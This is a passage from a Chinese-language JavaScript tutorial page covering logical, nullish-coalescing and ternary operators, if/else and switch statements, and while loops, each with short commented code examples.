class="keyword">var</span> y = (x = <span class="number">5</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解构赋值（ES6+）</span></span><br><span class="line"><span class="keyword">var</span> [first, second] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(first, second); <span class="comment">// 1 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123; name, age &#125; = &#123; <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>, <span class="attr">age</span>: <span class="number">25</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name, age); <span class="comment">// 张三 25</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认值</span></span><br><span class="line"><span class="keyword">var</span> &#123; city = <span class="string">&quot;北京&quot;</span> &#125; = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(city); <span class="comment">// &quot;北京&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="17-4-逻辑运算符"><a href="#17-4-逻辑运算符" class="headerlink" title="17.4 逻辑运算符"></a>17.4 逻辑运算符</h3><p><strong>详细解释：</strong></p>
<ul>
<li>用于布尔值的逻辑运算</li>
<li>包括逻辑与（&amp;&amp;）、逻辑或（||）、逻辑非（!）</li>
<li>支持短路求值</li>
<li>可用于条件判断和默认值设置</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 逻辑与（&amp;&amp;）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> &amp;&amp; <span class="literal">true</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">true</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 短路求值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;函数被调用&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> &amp;&amp; <span class="title function_">logMessage</span>()); <span class="comment">// 输出&quot;函数被调用&quot;，返回true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> &amp;&amp; <span class="title function_">logMessage</span>()); <span class="comment">// 不调用函数，返回false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑或（||）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> || <span class="literal">true</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> || <span class="literal">false</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> || <span class="literal">true</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> || <span class="literal">false</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> || <span class="title function_">logMessage</span>()); <span class="comment">// 输出&quot;函数被调用&quot;，返回true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">true</span> || <span class="title function_">logMessage</span>()); <span class="comment">// 不调用函数，返回true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑非（!）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(!<span class="literal">true</span>); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(!<span class="literal">false</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(!!<span class="string">&quot;Hello&quot;</span>); <span class="comment">// true（转换为布尔值）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认值设置</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> displayName = name || <span class="string">&quot;匿名用户&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(displayName); <span class="comment">// &quot;匿名用户&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> value = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> displayValue = value || <span class="string">&quot;无值&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(displayValue); <span class="comment">// &quot;无值&quot;（0被视为假值）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空值合并运算符（ES2020+）</span></span><br><span class="line"><span class="keyword">var</span> nullable = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> result = nullable ?? <span class="string">&quot;默认值&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// &quot;默认值&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zero = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> result2 = zero ?? <span class="string">&quot;默认值&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result2); <span class="comment">// 0（0不是null或undefined）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑赋值运算符（ES2021+）</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="literal">null</span>;</span><br><span class="line">a ??= <span class="string">&quot;默认值&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// &quot;默认值&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;已存在&quot;</span>;</span><br><span class="line">b ??= <span class="string">&quot;默认值&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// &quot;已存在&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="17-5-三元运算符"><a href="#17-5-三元运算符" class="headerlink" title="17.5 三元运算符"></a>17.5 三元运算符</h3><p><strong>详细解释：</strong></p>
<ul>
<li>条件表达式的简写形式</li>
<li>语法：<code>条件 ? 表达式1 : 表达式2</code></li>
<li>如果条件为真，返回表达式1；否则返回表达式2</li>
<li>可嵌套使用，但应避免过度嵌套</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="keyword">var</span> age = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">var</span> status = (age &gt;= <span class="number">18</span>) ? <span class="string">&quot;成年人&quot;</span> : <span class="string">&quot;未成年人&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(status); <span class="comment">// &quot;成年人&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套三元运算符</span></span><br><span class="line"><span class="keyword">var</span> score = <span class="number">85</span>;</span><br><span class="line"><span class="keyword">var</span> grade = (score &gt;= <span class="number">90</span>) ? <span class="string">&quot;A&quot;</span> :</span><br><span class="line">            (score &gt;= <span class="number">80</span>) ? <span class="string">&quot;B&quot;</span> :</span><br><span class="line">            (score &gt;= <span class="number">70</span>) ? <span class="string">&quot;C&quot;</span> : <span class="string">&quot;D&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(grade); <span class="comment">// &quot;B&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与逻辑运算符结合</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> greeting = name ? <span class="string">`你好，<span class="subst">$&#123;name&#125;</span>！`</span> : <span class="string">&quot;你好，访客！&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greeting); <span class="comment">// &quot;你好，张三！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于默认值</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> value = input !== <span class="literal">null</span> &amp;&amp; input !== <span class="literal">undefined</span> ? input : <span class="string">&quot;默认值&quot;</span>;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">var</span> value2 = input ?? <span class="string">&quot;默认值&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于简单条件赋值</span></span><br><span class="line"><span class="keyword">var</span> isDarkMode = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = isDarkMode ? <span class="string">&quot;#333&quot;</span> : <span class="string">&quot;#fff&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为函数返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getGreeting</span>(<span class="params">time</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (time &lt; <span class="number">12</span>) ? <span class="string">&quot;上午好&quot;</span> :</span><br><span class="line">           (time &lt; <span class="number">18</span>) ? <span class="string">&quot;下午好&quot;</span> : <span class="string">&quot;晚上好&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getGreeting</span>(<span class="number">10</span>)); <span class="comment">// &quot;上午好&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getGreeting</span>(<span class="number">15</span>)); <span class="comment">// &quot;下午好&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getGreeting</span>(<span class="number">20</span>)); <span class="comment">// &quot;晚上好&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：避免过度嵌套</span></span><br><span class="line"><span class="comment">// 不推荐</span></span><br><span class="line"><span class="keyword">var</span> result = condition1 ? value1 :</span><br><span class="line">            condition2 ? value2 :</span><br><span class="line">            condition3 ? value3 : value4;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐使用if-else或switch</span></span><br></pre></td></tr></table></figure>

<h2 id="18-流程控制语句"><a href="#18-流程控制语句" class="headerlink" title="18. 流程控制语句"></a>18. 流程控制语句</h2><h3 id="18-1-if语句"><a href="#18-1-if语句" class="headerlink" title="18.1 if语句"></a>18.1 if语句</h3><p><strong>详细解释：</strong></p>
<ul>
<li>根据条件执行代码块</li>
<li>语法：<code>if (条件) { 代码块 }</code></li>
<li>条件为真时执行代码块</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> score = <span class="number">85</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多行语句不需要大括号（不推荐）</span></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">90</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 布尔转换</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (name) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;名字存在&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> empty = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!empty) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;字符串为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复杂条件</span></span><br><span class="line"><span class="keyword">var</span> age = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">var</span> hasLicense = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (age &gt;= <span class="number">18</span> &amp;&amp; hasLicense) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;可以开车&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-2-if-else语句"><a href="#18-2-if-else语句" class="headerlink" title="18.2 if-else语句"></a>18.2 if-else语句</h3><p><strong>详细解释：</strong></p>
<ul>
<li>提供条件为假时的备选代码块</li>
<li>语法：<code>if (条件) { 代码块1 } else { 代码块2 }</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> score = <span class="number">75</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套if-else</span></span><br><span class="line"><span class="keyword">var</span> age = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;未成年人&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (age &lt; <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成年人&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;老年人&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三元运算符替代</span></span><br><span class="line"><span class="keyword">var</span> message = (score &gt;= <span class="number">60</span>) ? <span class="string">&quot;及格&quot;</span> : <span class="string">&quot;不及格&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多条件判断</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正数&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;负数&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;零&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-3-if…else-if…else语句"><a href="#18-3-if…else-if…else语句" class="headerlink" title="18.3 if…else if…else语句"></a>18.3 if…else if…else语句</h3><p><strong>详细解释：</strong></p>
<ul>
<li>用于多条件分支判断</li>
<li>语法：<code>if (条件1) { ... } else if (条件2) { ... } else { ... }</code></li>
<li>按顺序检查条件，执行第一个为真的条件对应的代码块</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> score = <span class="number">85</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;中等&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期判断</span></span><br><span class="line"><span class="keyword">var</span> day = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getDay</span>();</span><br><span class="line"><span class="keyword">if</span> (day === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期日&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (day === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期一&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (day === <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期二&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (day === <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期三&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (day === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期四&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (day === <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期五&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期六&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先级示例</span></span><br><span class="line"><span class="keyword">var</span> value = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (value &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;大于5&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;大于8&quot;</span>); <span class="comment">// 永远不会执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;小于等于5&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-4-switch语句"><a href="#18-4-switch语句" class="headerlink" title="18.4 switch语句"></a>18.4 switch语句</h3><p><strong>详细解释：</strong></p>
<ul>
<li>用于多分支选择</li>
<li>语法：<code>switch (表达式) { case 值: ... break; ... default: ... }</code></li>
<li>比较表达式与case值的严格相等（&#x3D;&#x3D;&#x3D;）</li>
<li>使用break防止穿透</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> day = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getDay</span>();</span><br><span class="line"><span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期日&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期一&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期二&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期三&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期四&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期五&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;星期六&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;无效的日期&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不使用break的穿透效果</span></span><br><span class="line"><span class="keyword">var</span> fruit = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (fruit) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;apple&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;banana&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;orange&quot;</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是水果&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;carrot&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;broccoli&quot;</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是蔬菜&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;未知类型&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多重case</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">switch</span> (num) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1-3之间&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;其他&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用表达式</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> a &gt; <span class="attr">b</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a大于b&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> a &lt; <span class="attr">b</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a小于b&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a等于b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串匹配</span></span><br><span class="line"><span class="keyword">var</span> color = <span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (color) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;red&quot;</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;红色&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;green&quot;</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;绿色&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;blue&quot;</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;蓝色&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;其他颜色&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-5-循环结构"><a href="#18-5-循环结构" class="headerlink" title="18.5 循环结构"></a>18.5 循环结构</h3><h4 id="18-5-1-while循环"><a href="#18-5-1-while循环" class="headerlink" title="18.5.1 while循环"></a>18.5.1 while循环</h4><p><strong>详细解释：</strong></p>
<ul>
<li>先判断条件，条件为真时执行循环体</li>
<li>语法：<code>while (条件) { 循环体 }</code></li>
<li>可能一次都不执行</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;当前值: &quot;</span> + i);</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算1到100的和</span></span><br><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (num &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">    sum += num;</span><br><span class="line">    num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1到100的和: &quot;</span> + sum); <span class="comment">// 5050</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取用户输入</span></span><br><span class="line"><span class="keyword">var</span> input;</span><br><span class="line"><span class="keyword">while</span> ((input = <span class="title function_">prompt</span>(<span class="string">&quot;请输入&#x27;quit&#x27;退出&quot;</span>)) !== <span class="string">&quot;quit&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你输入了: &quot;</span> + input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 避免无限循环</span></span><br><span class="line"><span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (counter &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(counter);</span><br><span class="line">    counter++; <span class="comment">// 必须有递增/递减</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (index &lt; arr.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[index]);</span><br><span class="line">    index++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

